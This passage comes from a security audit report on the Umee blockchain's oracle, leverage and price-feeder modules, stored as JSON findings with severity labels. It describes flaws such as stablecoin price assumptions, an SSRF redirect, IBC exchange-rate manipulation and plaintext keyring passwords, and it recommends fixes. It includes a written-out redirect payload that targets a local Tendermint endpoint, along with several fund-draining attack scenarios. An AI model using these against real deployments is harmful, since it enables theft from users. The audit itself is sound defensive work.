        "body": "If the denominator string passed to the GetExchangeRateBase function contains the substring USD (gure 7.1), the function returns 1 , presumably to indicate that the denominator is a stablecoin. If the system accepts an ERC20 token that is not a stablecoin but has a name containing USD, the system will report an incorrect exchange rate for the asset, which may enable token theft. Moreover, the price of an actual USD stablecoin may vary from USD 1. Therefore, if a stablecoin used as collateral for a loan loses its peg, the loan may not be liquidated correctly. // GetExchangeRateBase gets the consensus exchange rate of an asset // in the base denom (e.g. ATOM -> uatom) func (k Keeper) GetExchangeRateBase(ctx sdk.Context, denom string ) (sdk.Dec, error ) { if strings.Contains(strings.ToUpper(denom), types.USDDenom) { return sdk.OneDec(), nil } // (...) Figure 7.1: umee/x/oracle/keeper/keeper.go#L89-L94 func (k Keeper) TokenPrice(ctx sdk.Context, denom string ) (sdk.Dec, error ) { if !k.IsAcceptedToken(ctx, denom) { return sdk.ZeroDec(), sdkerrors.Wrap(types.ErrInvalidAsset, denom) } price, err := k.oracleKeeper.GetExchangeRateBase(ctx, denom) // (...) return price, nil } Figure 7.2: umee/x/leverage/keeper/oracle.go#L12-L34 Exploit Scenario Umee adds the cUSDC ERC20 token as an accepted token. Upon its addition, its price is USD 0.02, not USD 1. However, because of the incorrect price assumption, the system sets its price to USD 1. This enables an attacker to create an undercollateralized loan and to draw funds from the system. Exploit Scenario 2 The price of a stablecoin drops signicantly. However, the x/leverage module fails to detect the change and reports the price as USD 1. This enables an attacker to create an undercollateralized loan and to draw funds from the system. Recommendations Short term, remove the condition that causes the GetExchangeRateBase function to return a price of USD 1 for any asset whose name contains USD.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "8. Oracle price-feeder is vulnerable to manipulation by a single malicious price feed ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "body": "The price-feeder component uses a volume-weighted average price (VWAP) formula to compute average prices from various third-party providers. The price it determines is then sent to the x/oracle module, which commits it on-chain. However, an asset price could easily be manipulated by only one compromised or malfunctioning third-party provider. Exploit Scenario Most validators are using the Binance API as one of their price providers. The API is compromised by an attacker and suddenly starts to report prices that are much higher than those reported by other providers. However, the price-feeder instances being used by the validators do not detect the discrepancies in the Binance API prices. As a result, the VWAP value computed by the price-feeder and committed on-chain is much higher than it should be. Moreover, because most validators have committed the wrong price, the average computed on-chain is also wrong. The attacker then draws funds from the system. Recommendations Short term, implement a price-feeder mechanism for detecting the submission of wildly incorrect prices by a third-party provider. Have the system temporarily disable the use of the malfunctioning provider(s) and issue an alert calling for an investigation. If it is not possible to automatically identify the malfunctioning provider(s), stop committing prices. (Note, though, that this may result in a loss of interest for validators.) Consider implementing a similar mechanism in the x/oracle module so that it can identify when the exchange rates committed by validators are too similar to one another or to old values. References  Synthetix Response to Oracle Incident",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. Oracle rewards may not be distributed ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "body": "If the x/oracle module lacks the coins to cover a reward payout, the rewards will not be distributed or registered for payment in the future. var periodRewards sdk.DecCoins for _, denom := range rewardDenoms { rewardPool := k.GetRewardPool(ctx, denom) // return if there's no rewards to give out if rewardPool.IsZero() { continue } periodRewards = periodRewards.Add(sdk.NewDecCoinFromDec( denom, sdk.NewDecFromInt(rewardPool.Amount).Mul(distributionRatio), )) } Figure 9.1: A loop in the code that calculates oracle rewards ( umee/x/oracle/keeper/reward.go#4356 ) Recommendations Short term, document the fact that oracle rewards will not be distributed when the x/oracle module does not have enough coins to cover the rewards.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. Risk of server-side request forgery attacks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "body": "The price-feeder sends HTTP requests to congured providers APIs. If any of the HTTP responses is a redirect response (e.g., one with HTTP response code 301), the module will automatically issue a new request to the address provided in the responses header. The new address may point to a local address, potentially one that provides access to restricted services. Exploit Scenario An attacker gains control over the Osmosis API. He changes the endpoint used by the price-feeder such that it responds with a redirect like that shown in gure 10.1, with the goal of removing a transaction from a Tendermint validators mempool. The price-feeder automatically issues a new request to the Tendermint REST API. Because the API does not require authentication and is running on the same machine as the price-feeder , the request is successful, and the target transaction is removed from the validator's mempool. HTTP/1.1 301 Moved Permanently Location: http://localhost:26657/remove_tx?txKey=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa Figure 10.1: The redirect response Recommendations Short term, use a function such as CheckRedirect to disable redirects, or at least redirects to local services, in all HTTP clients.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. Incorrect comparison in SetCollateralSetting method ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "body": "Umee users can send a SetCollateral message to disable the use of a certain asset as collateral. The messages are handled by the SetCollateralSetting method (gure 11.1), which should ensure that the borrow limit will not drop below the amount borrowed. However, the function uses an incorrect comparison, checking that the borrow limit will be greater than, not less than, that amount. // Return error if borrow limit would drop below borrowed value if newBorrowLimit.GT(borrowedValue) { return sdkerrors.Wrap(types.ErrBorrowLimitLow, newBorrowLimit.String()) } Figure 11.1: The incorrect comparison in the SetCollateralSetting method ( umee/x/leverage/keeper/keeper.go#343346 ) Exploit Scenario An attacker provides collateral to the Umee system and borrows some coins. Then the attacker disables the use of the collateral asset; because of the incorrect comparison in the SetCollateralSetting method, the disable operation succeeds, and the collateral is sent back to the attacker. Recommendations Short term, correct the comparison in the SetCollateralSetting method. Long term, implement tests to check whether basic functionality works as expected.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "12. Voters ability to overwrite their own pre-votes is not documented ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "body": "The x/oracle module allows voters to submit more than one pre-vote message during the same pre-voting period, overwriting their previous pre-vote messages (gure 12.1). This feature is not documented; while it does not constitute a direct security risk, it may be unintended behavior. Third parties may incorrectly assume that validators cannot change their pre-vote messages. Monitoring systems may detect only the rst pre-vote event for a validators pre-vote messages, while voters may trust the exchange rates and salts revealed by other voters to be nal. On the other hand, this feature may be an intentional one meant to allow voters to update the exchange rates they submit as they obtain more accurate pricing information. func (ms msgServer) AggregateExchangeRatePrevote( goCtx context.Context, msg *types.MsgAggregateExchangeRatePrevote, ) (*types.MsgAggregateExchangeRatePrevoteResponse, error ) { // (...) aggregatePrevote := types.NewAggregateExchangeRatePrevote(voteHash, valAddr, uint64 (ctx.BlockHeight())) // This call overwrites previous pre-vote if there was one ms.SetAggregateExchangeRatePrevote(ctx, valAddr, aggregatePrevote) ctx.EventManager().EmitEvents(sdk.Events{ // (...) - emit EventTypeAggregatePrevote and EventTypeMessage }) return &types.MsgAggregateExchangeRatePrevoteResponse{}, nil } Figure 12.1: umee/x/oracle/keeper/msg_server.go#L23-L66 Recommendations Short term, document the fact that a pre-vote message can be submitted and overwritten in the same voting period. Alternatively, disallow this behavior by having the AggregateExchangeRatePrevote function return an error if a validator attempts to submit an additional exchange rate pre-vote message. Long term, add tests to check for this behavior.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "13. Lack of user-controlled limits for input amount in LiquidateBorrow ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "body": "The x/leverage modules LiquidateBorrow function computes the amount of funds that will be transferred from the module to the functions caller in a liquidation. The computation uses asset prices retrieved from an oracle. There is no guarantee that the amount returned by the module will correspond to the current market price, as a transaction that updates the price feed could be mined before the call to LiquidateBorrow . Adding a lower limit to the amount sent by the module would enable the caller to explicitly state his or her assumptions about the liquidation and to ensure that the collateral payout is as protable as expected. It would also provide additional protection against the misreporting of oracle prices. Since such a scenario is unlikely, we set the diculty level of this nding to high. Using caller-controlled limits for the amount of a transfer is a best practice commonly employed by large DeFi protocols such as Uniswap. Exploit Scenario Alice calls the LiquidateBorrow function. Due to an oracle malfunction, the amount of collateral transferred from the module is much lower than the amount she would receive on another market. Recommendations Short term, introduce a minRewardAmount parameter and add a check verifying that the reward value is greater than or equal to the minRewardAmount value. Long term, always allow the caller to control the amount of a transfer. This is especially important for transfer amounts that depend on factors that can change between transactions. Enable the caller to add a lower limit for a transfer from a module and an upper limit for a transfer of the callers funds to a module.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "14. Lack of simulation and fuzzing of leverage module invariants ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "body": "The Umee system lacks comprehensive Cosmos SDK simulations and invariants for its x/oracle and x/leverage modules. More thorough use of the simulation feature would facilitate fuzz testing of the entire blockchain and help ensure that the invariants hold. Additionally, the current simulation module may need to be modied for the following reasons:     It exits on the rst transaction error . To avoid an early exit, it could skip transactions that are expected to fail when they are generated; however, that could also cause it to skip logic that contains issues. The numKeys argument , which determines how many accounts it will use, can range from 2 to 2,500. Using too many accounts may hinder the detection of bugs that require multiple transactions to be executed by a few accounts. By default, it is congured to use a \"stake\" currency , which may not be used in the nal Umee system. Running it with a small number of accounts and a large block size for many blocks could quickly cause all validators to be unbonded. To avoid this issue, the simulation would need the ability to run for a longer time. attempted to use the simulation module by modifying the recent changes to the Umee codebase, which introduce simulations for the x/oracle and x/leverage modules (commit f22b2c7f8e ). We enabled the x/leverage module simulation and modied the Cosmos SDK codebase locally so that the framework would use fewer accounts and log errors via Fatalf logs instead of exiting. The framework helped us nd the issue described in TOB-UMEE-15 , but the setup and tests we implemented were not exhaustive. We sent the codebase changes we made to the Umee team via an internal chat. Recommendations Short term, identify, document, and test all invariants that are important for the systems security, and identify and document the arbitrage opportunities created by the system. Enable simulation of the x/oracle and x/leverage modules and ensure that the following assertions and invariants are checked during simulation runs: 1. In the UpdateExchangeRates function , the token supply value corresponds to the uToken supply value. Implement the following check: if uTokenSupply != 0 { assert(tokenSupply != 0) } 2. In the LiquidateBorrow function (after the line  if !repayment.Amount.IsPositive()  ) , the following comparisons evaluate to true: ExchangeUToken(reward) == EquivalentTokenValue(repayment, baseRewardDenom) TokenValue(ExchangeUToken(ctx, reward)) == TokenValue(repayment) borrowed.AmountOf(repayment.Denom) >= repayment.Amount collateral.AmountOf(rewardDenom) >= reward.Amount module's collateral amount >= reward.Amount repayment <= desiredRepayment 3. The x/leverage module is never signicantly undercollateralized at the end of a transaction. Implement a check, total collateral value * X >= total borrows value , in which X is close to 1. (It may make sense for the value of X to be greater than or equal to 1 to account for module reserves.) It may be acceptable for the module to be slightly undercollateralized, as it may mean that some liquidations have yet to be executed. 4. The amount of reserves remains above a certain minimum value, or new loans cannot be issued if the amount of reserves drops below a certain value. 5. The interest on a loan is less than or equal to the borrowing fee. (This invariant is related to the issue described in TOB-UMEE-23 .) 6. 7. 8. It is impossible to borrow funds without paying a fee. Currently, when four messages (lend, borrow, repay, and withdraw messages) are sent in one transaction, the EndBlocker method will not collect borrowing fees. Token/uToken exchange rates are always greater than or equal to 1 and are less than an expected maximum. To avoid rapid signicant price increases and decreases, ensure that the rates do not change more quickly than expected. The exchangeRate value cannot be changed by public (user-callable) methods like LendAsset and WithdrawAsset . Pay special attention to rounding errors and make sure that the module is the beneciary of all rounding operations. 9. It is impossible to liquidate more than the closeFactor in a single liquidation transaction for a defaulted loan; be mindful of the fact that a single transaction can include more than one message. Long term, e xtend the simulation module to cover all operations that may occur in a real Umee deployment, along with all potential error states, and run it many times before each release. Ensure the following:       All modules and operations are included in the simulation module. The simulation uses a small number of accounts (e.g., between 5 and 20) to increase the likelihood of an interesting state change. The simulation uses the currencies/tokens that will be used in the production network. Oracle price changes are properly simulated. (In addition to a mode in which prices are changed randomly, implement a mode in which prices are changed only slightly, a mode in which prices are highly volatile, and a mode in which prices decrease or increase continuously for a long time period.) The simulation continues running when a transaction triggers an error. All transaction code paths are executed. (Enable code coverage to see how often individual lines are executed.)",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "15. Attempts to overdraw collateral cause WithdrawAsset to panic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "body": "The WithdrawAsset function panics when an account attempts to withdraw more collateral than the account holds. While panics triggered during transaction runs are recovered by the Cosmos SDK , they should be used only to handle unexpected events that should not occur in normal blockchain operations. The function should instead check the collateralToWithdraw value and return an error if it is too large. The panic occurs in the Dec.Sub method when the calculation it performs results in an overow (gure 15.1). func (k Keeper) WithdrawAsset( /* (...) */ ) error { // (...) if amountFromCollateral.IsPositive() { if k.GetCollateralSetting(ctx, lenderAddr, uToken.Denom) { // (...) // Calculate what borrow limit will be AFTER this withdrawal collateral := k.GetBorrowerCollateral(ctx, lenderAddr) collateralToWithdraw := sdk.NewCoins(sdk.NewCoin(uToken.Denom, amountFromCollateral)) newBorrowLimit, err := k.CalculateBorrowLimit(ctx, collateral.Sub(collateralToWithdraw) ) Figure 15.1: umee/x/leverage/keeper/keeper.go#L124-L159 To reproduce this issue, use the test shown in gure 15.2. Exploit Scenario A user of the Umee system who has enabled the collateral setting lends 1,000 UMEE tokens. The user later tries to withdraw 1,001 UMEE tokens. Due to the lack of validation of the collateralToWithdraw value, the transaction causes a panic. However, the panic is recovered, and the transaction nishes with a panic error . Because the system does not provide a proper error message, the user is confused about why the transaction failed. Recommendations Short term, when a user attempts to withdraw collateral, have the WithdrawAsset function check whether the collateralToWithdraw value is less than or equal to the collateral balance of the users account and return an error if it is not. This will prevent the function from panicking if the withdrawal amount is too large. Long term, integrate the test shown in gure 15.2 into the codebase and extend it with additional assertions to verify other program states. func (s *IntegrationTestSuite) TestWithdrawAsset_InsufficientCollateral() { app, ctx := s.app, s.ctx lenderAddr := sdk.AccAddress([] byte ( \"addr________________\" )) lenderAcc := app.AccountKeeper.NewAccountWithAddress(ctx, lenderAddr) app.AccountKeeper.SetAccount(ctx, lenderAcc) // mint and send coins s.Require().NoError(app.BankKeeper.MintCoins(ctx, minttypes.ModuleName, initCoins)) s.Require().NoError(app.BankKeeper.SendCoinsFromModuleToAccount(ctx, minttypes.ModuleName, lenderAddr, initCoins)) // mint additional coins for just the leverage module; this way it will have available reserve // to meet conditions in the withdrawal logic s.Require().NoError(app.BankKeeper.MintCoins(ctx, types.ModuleName, initCoins)) // set collateral setting for the account uTokenDenom := types.UTokenFromTokenDenom(umeeapp.BondDenom) err := s.app.LeverageKeeper.SetCollateralSetting(ctx, lenderAddr, uTokenDenom, true ) s.Require().NoError(err) // lend asset err = s.app.LeverageKeeper.LendAsset(ctx, lenderAddr, sdk.NewInt64Coin(umeeapp.BondDenom, 1000000000 )) // 1k umee s.Require().NoError(err) // verify collateral amount and total supply of minted uTokens collateral := s.app.LeverageKeeper.GetCollateralAmount(ctx, lenderAddr, uTokenDenom) expected := sdk.NewInt64Coin(uTokenDenom, 1000000000 ) // 1k u/umee s.Require().Equal(collateral, expected) supply := s.app.LeverageKeeper.TotalUTokenSupply(ctx, uTokenDenom) s.Require().Equal(expected, supply) // withdraw more collateral than having - this panics currently uToken := collateral.Add(sdk.NewInt64Coin(uTokenDenom, 1 )) err = s.app.LeverageKeeper.WithdrawAsset(ctx, lenderAddr, uToken) s.Require().EqualError(err, \"TODO/FIXME: set proper error string here after fixing panic error\" ) // TODO/FIXME: add asserts to verify all other program state } Figure 15.2: A test that can be used to reproduce this issue",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "16. Division by zero causes the LiquidateBorrow function to panic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "body": "Two operations in the x/leverage modules LiquidateBorrow method may involve division by zero and lead to a panic. The rst operation is shown in gure 16.1. If both repayValue and maxRepayValue are zero, the GTE (greater-than-or-equal-to) comparison will succeed, and the Quo method will panic. The repayValue variable will be set to zero if liquidatorBalance is set to zero; maxRepayValue will be set to zero if either closeFactor or borrowValue is set to zero. if repayValue.GTE(maxRepayValue) { // repayment *= (maxRepayValue / repayValue) repayment.Amount = repayment.Amount.ToDec().Mul(maxRepayValue) .Quo(repayValue) .TruncateInt() repayValue = maxRepayValue } Figure 16.1: A potential instance of division by zero ( umee/x/leverage/keeper/keeper.go#452456 ) The second operation is shown in gure 16.2. If both reward.Amount and collateral.AmountOf(rewardDenom) are set to zero, the GTE comparison will succeed, and the Quo method will panic. The collateral.AmountOf(rewardDenom) variable can easily be set to zero, as the user may not have any collateral in the denomination indicated by the variable; reward.Amount will be set to zero if liquidatorBalance is set to zero. // reward amount cannot exceed available collateral if reward.Amount.GTE(collateral.AmountOf(rewardDenom)) { // reduce repayment.Amount to the maximum value permitted by the available collateral reward repayment.Amount = repayment.Amount.Mul(collateral.AmountOf(rewardDenom)) .Quo(reward.Amount) // use all collateral of reward denom reward.Amount = collateral.AmountOf(rewardDenom) } Figure 16.2: A potential instance of division by zero ( umee/x/leverage/keeper/keeper.go#474480 ) Exploit Scenario A user tries to liquidate a loan. For reasons that are unclear to the user, the transaction fails with a panic. Because the error message is not specic, the user has diculty debugging the error. Recommendations Short term, replace the GTE comparison with a strict inequality GT (greater-than) comparison. Long term, carefully validate variables in the LiquidateBorrow method to ensure that every variable stays within the expected range during the entire computation . Write negative tests with edge-case values to ensure that the methods handle errors gracefully.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "17. Architecture-dependent code ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "body": "In the Go programming language, the bit size of an int variable depends on the platform on which the code is executed. On a 32-bit platform, it will be 32 bits, and on a 64-bit platform, 64 bits. Validators running on dierent architectures will therefore interpret int types dierently, which may lead to transaction-parsing discrepancies and ultimately to a consensus failure or chain split. One use of the int type is shown in gure 17.1. Because casting the maxValidators variable to the int type should not cause it to exceed the maximum int value for a 32-bit platform, we set the severity of this nding to informational. for ; iterator.Valid() && i < int (maxValidators) ; iterator.Next() { Figure 17.1: An architecture-dependent loop condition in the EndBlocker method ( umee/x/oracle/abci.go#34 ) Exploit Scenario The maxValidators variable (a variable of the uint32 type) is set to its maximum value, 4,294,967,296. During the execution of the x/oracle modules EndBlocker method, some validators cast the variable to a negative number, while others cast it to a large positive integer. The chain then stops working because the validators cannot reach a consensus. Recommendations Short term, ensure that architecture-dependent types are not used in the codebase . Long term, test the system with parameters set to various edge-case values, including the maximum and minimum values of dierent integer types. Test the system on all common architectures (e.g., architectures with 32- and 64-bit CPUs), or develop documentation specifying the architecture(s) used in testing.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "18. Weak cross-origin resource sharing settings ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "body": "In the price-feeder s cross-origin resource sharing (CORS) settings, most of the same-origin policy protections are disabled. This increases the severity of vulnerabilities like cross-site request forgery. v1Router.Methods( \"OPTIONS\" ).HandlerFunc( func (w http.ResponseWriter, r *http.Request) { w.Header().Set( \"Access-Control-Allow-Origin\" , r.Header.Get( \"Origin\" )) w.Header().Set( \"Access-Control-Allow-Methods\" , \"GET, PUT, POST, DELETE, OPTIONS\" ) w.Header().Set( \"Access-Control-Allow-Headers\" , \"Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With\" ) w.Header().Set( \"Access-Control-Allow-Credentials\" , \"true\" ) w.WriteHeader(http.StatusOK) }) Figure 18.1: The current CORS conguration ( umee/price-feeder/router/v1/router.go#4652 ) We set the severity of this nding to informational because no sensitive endpoints are exposed by the price-feeder router. Exploit Scenario A new endpoint is added to the price-feeder API. It accepts PUT requests that can update the tools provider list. An attacker uses phishing to lure the price-feeder s operator to a malicious website. The website triggers an HTTP PUT request to the API, changing the provider list to a list in which all addresses are controlled by the attacker. The attacker then repeats the attack against most of the validators, manipulates on-chain prices, and drains the systems funds. Recommendations Short term, use strong default values in the CORS settings . Long term, ensure that APIs exposed by the price-feeder have proper protections against web vulnerabilities.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "19. price-feeder is at risk of rate limiting by public APIs ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "body": "Price providers used by the price-feeder tool may enforce limits on the number of requests served to them. After reaching a limit, the tool should take certain actions to avoid a prolonged or even permanent ban. Moreover, using API keys or non-HTTP access channels would decrease the price-feeder s chance of being rate limited. Every API has its own rules, which should be reviewed and respected. The rules of three APIs are summarized below.    Binance has hard, machine-learning, and web application rewall limits . Users are required to stop sending requests if they receive a 429 HTTP response code . Kraken implements rate limiting based on call counters and recommends using the WebSockets API instead of the REST API. Huopi restricts the number of requests to 10 per second and recommends using an API key. Exploit Scenario A price-feeder exceeds the limits of the Binance API. It is rate limited and receives a 429 HTTP response code from the API. The tool does not notice the response code and continues to spam the API. As a result, it receives a permanent ban. The validator using the price-feeder then starts reporting imprecise exchange rates and gets slashed. Recommendations Short term, review the requirements and recommendations of all APIs supported by the system . Enforce their requirements in a user-friendly manner; for example, allow users to set and rotate API keys, delay HTTP requests so that the price-feeder will avoid rate limiting but still report accurate prices, and log informative error messages upon reaching rate limits. Long term, perform stress-testing to ensure that the implemented safety checks work properly and are robust.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "20. Lack of prioritization of oracle messages ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "body": "Oracle messages are not prioritized over other transactions for inclusion in a block. If the network is highly congested, the messages may not be included in a block. Although the Umee system could increase the fee charged for including an oracle message in a block, that solution is suboptimal and may not work. Tactics for prioritizing important transactions include the following:    Using the custom CheckTx implementation introduced in Tendermint version 0.35 , which returns a priority argument Reimplementing part of the Tendermint engine , as Terra Money did Using Substrates dispatch classes , which allow developers to mark transactions as normal , operational , or mandatory Exploit Scenario The Umee network is congested. Validators send their exchange rate votes, but the exchange rates are not included in a block. An attacker then exploits the situation by draining the network of its tokens. Recommendations Short term, use a custom CheckTx method to prioritize oracle messages . This will help prevent validators votes from being left out of a block and ignored by an oracle. Long term, ensure that operations that aect the whole system cannot be front-run or delayed by attackers or blocked by network congestion.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "21. Risk of token/uToken exchange rate manipulation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "body": "The Umee specication states that the token/uToken exchange rate can be aected only by the accrual of interest (not by Lend , Withdraw , Borrow , Repay , or Liquidate transactions). However, this invariant can be broken:   When tokens are burned or minted through an Inter-Blockchain Communication (IBC) transfer, the ibc-go library accesses the x/bank modules keeper interface, which changes the total token supply (as shown in gure 21.2). This behavior is mentioned in a comment shown in gure 22.1. Sending tokens directly to the module through an x/bank message also aects the exchange rate. func (k Keeper) TotalUTokenSupply(ctx sdk.Context, uTokenDenom string ) sdk.Coin { if k.IsAcceptedUToken(ctx, uTokenDenom) { return k.bankKeeper.GetSupply(ctx, uTokenDenom) // TODO - Question: Does bank module still track balances sent (locked) via IBC? // If it doesn't then the balance returned here would decrease when the tokens // are sent off, which is not what we want. In that case, the keeper should keep // an sdk.Int total supply for each uToken type. } return sdk.NewCoin(uTokenDenom, sdk.ZeroInt()) } Figure 21.1: The method vulnerable to unexpected IBC transfers ( umee/x/leverage/keeper/keeper.go#6573 ) if err := k.bankKeeper.BurnCoins( ctx, types.ModuleName, sdk.NewCoins(token), Figure 21.2: The IBC library code that accesses the x/bank modules keeper interface ( ibc-go/modules/apps/transfer/keeper/relay.go#136137 ) Exploit Scenario An attacker with two Umee accounts lends tokens through the system and receives a commensurate number of uTokens. He temporarily sends the uTokens from one of the accounts to another chain (chain B), decreasing the total supply and increasing the token/uToken exchange rate. The attacker uses the second account to withdraw more tokens than he otherwise could and then sends uTokens back from chain B to the rst account. In this way, he drains funds from the module. Recommendations Short term, ensure that the TotalUTokenSupply method accounts for IBC transfers. Use the Cosmos SDKs blocklisting feature to disable direct transfers to the leverage and oracle modules. Consider setting DefaultSendEnabled to false and explicitly enabling certain tokens transfer capabilities. Long term, follow GitHub issues #10386 and #5931 , which concern functionalities that may enable module developers to make token accounting more reliable. Additionally, ensure that the system accounts for ination .",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "22. Collateral dust prevents the designation of defaulted loans as bad debt ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "body": "An accounts debt is considered bad debt only if its collateral balance drops to zero. The debt is then repaid from the modules reserves. However, users may liquidate the majority of an accounts assets but leave a small amount of debt unpaid. In that case, the transaction fees may make liquidation of the remaining collateral unprotable. As a result, the bad debt will not be paid from the module's reserves and will linger in the system indenitely. Exploit Scenario A large loan taken out by a user becomes highly undercollateralized. An attacker liquidates most of the users collateral to repay the loan but leaves a very small amount of the collateral unliquidated. As a result, the loan is not considered bad debt and is not paid from the reserves. The rest of the tokens borrowed by the user remain out of circulation, preventing other users from withdrawing their funds. Recommendations Short term, establish a lower limit on the amount of collateral that must be liquidated in one transaction to prevent accounts from holding dust collateral. Long term, establish a lower limit on the number of tokens to be used in every system operation. That way, even if the systems economic incentives are lacking, the operations will not result in dust tokens.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "23. Users can borrow assets that they are actively using as collateral ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "body": "When a user calls the BorrowAsset function to take out a loan, the function does not check whether the user is borrowing the same type of asset as the collateral he or she supplied. In other words, a user can borrow tokens from the collateral that the user supplied. The Umee system prohibits users from borrowing assets worth more than the collateral they have provided, so a user cannot directly exploit this issue to borrow more funds than the user should be able to borrow. However, a user can borrow the vast majority of his or her collateral to continue accumulating lending rewards while largely avoiding the risks of providing collateral. Exploit Scenario An attacker provides 10 ATOMs to the protocol as collateral and then immediately borrows 9 ATOMs. He continues to earn lending rewards on his collateral but retains the use of most of the collateral. The attacker, through ash loans, could also resupply the borrowed amount as collateral and then immediately take out another loan, repeating the process until the amount he had borrowed asymptotically approached the amount of liquidity he had provided. Recommendations Short term, determine whether borrowers ability to borrow their own collateral is an issue. (Note that Compounds front end disallows such operations, but its actual contracts do not.) If it is, have BorrowAsset check whether a user is attempting to borrow the same asset that he or she staked as collateral and block the operation if so. Alternatively, ensure that borrow fees are greater than prots from lending. Long term, assess whether the liquidity-mining incentives accomplish their intended purpose, and ensure that the lending incentives and borrowing costs work well together.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Low"
        ]
    },
    {
        "title": "24. Providing additional collateral may be detrimental to borrowers in default ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "body": "When a user who is in default on a loan deposits additional collateral, the collateral will be immediately liquidable. This may be surprising to users and may aect their satisfaction with the system. Exploit Scenario A user funds a loan and plans to use the coins he deposited as the collateral on a new loan. However, the user does not realize that he defaulted on a previous loan. As a result, bots instantly liquidate the new collateral he provided. Recommendations Short term, if a user is in default on a loan, consider blocking the user from calling the LendAsset or SetCollateralSetting function with an amount of collateral insucient to collateralize the defaulted position . Alternatively, document the risks associated with calling these functions when a user has defaulted on a loan. Long term, ensure that users cannot incur unexpected nancial damage, or document the nancial risks that users face.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "25. Insecure storage of price-feeder keyring passwords ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/Umee.pdf",
        "body": "Users can store oracle keyring passwords in the price-feeder conguration le. However, the price-feeder stores these passwords in plaintext and does not provide a warning if the conguration le has overly broad permissions (like those shown in gure 25.1). Additionally, neither the price-feeder README nor the relevant documentation string instructs users to provide keyring passwords via standard input (gure 25.2), which is a safer approach. Moreover, neither source provides information on dierent keyring back ends, and the example price-feeder conguration uses the \"test\" back end . An attacker with access to the conguration le on a users system, or to a backup of the conguration le, could steal the users keyring information and hijack the price-feeder oracle instance. $ ls -la ./price-feeder/price-feeder.example.toml -rwx rwxrwx 1 dc dc 848 Feb 6 10:37 ./price-feeder/price-feeder.example.toml $ grep pass ./price-feeder/price-feeder.example.toml pass = \"exampleKeyringPassword\" $ ~/go/bin/price-feeder ./price-feeder/price-feeder.example.toml 10:42AM INF starting price-feeder oracle... 10:42AM ERR oracle tick failed error=\"key with addressA4F324A31DECC0172A83E57A3625AF4B89A91F1Fnot found: key not found\" module=oracle 10:42AM INF starting price-feeder server... listen_addr=0.0.0.0:7171 Figure 25.1: The price-feeder does not warn the user if the conguration le used to store the keyring password in plaintext has overly broad permissions. // CreateClientContext creates an SDK client Context instance used for transaction // generation, signing and broadcasting. func (oc OracleClient) CreateClientContext() (client.Context, error ) { var keyringInput io.Reader if len (oc.KeyringPass) > 0 { keyringInput = newPassReader(oc.KeyringPass) } else { keyringInput = os.Stdin } Figure 25.2: The price-feeder supports the use of standard input to provide keyring passwords. ( umee/price-feeder/oracle/client/client.go#L184-L192 ) Exploit Scenario A user sets up a price-feeder oracle and stores the keyring password in the price-feeder conguration le, which has been miscongured with overly broad permissions. An attacker gains access to another user account on the user's machine and is able to read the price-feeder oracle's keyring password. The attacker uses that password to access the keyring data and can then control the user's oracle account. Recommendations Short term, take the following steps:     Recommend that users provide keyring passwords via standard input. Check the permissions of the conguration le. If the permissions are too broad, provide an error warning the user of the issue, as openssh does when it nds that a private key le has 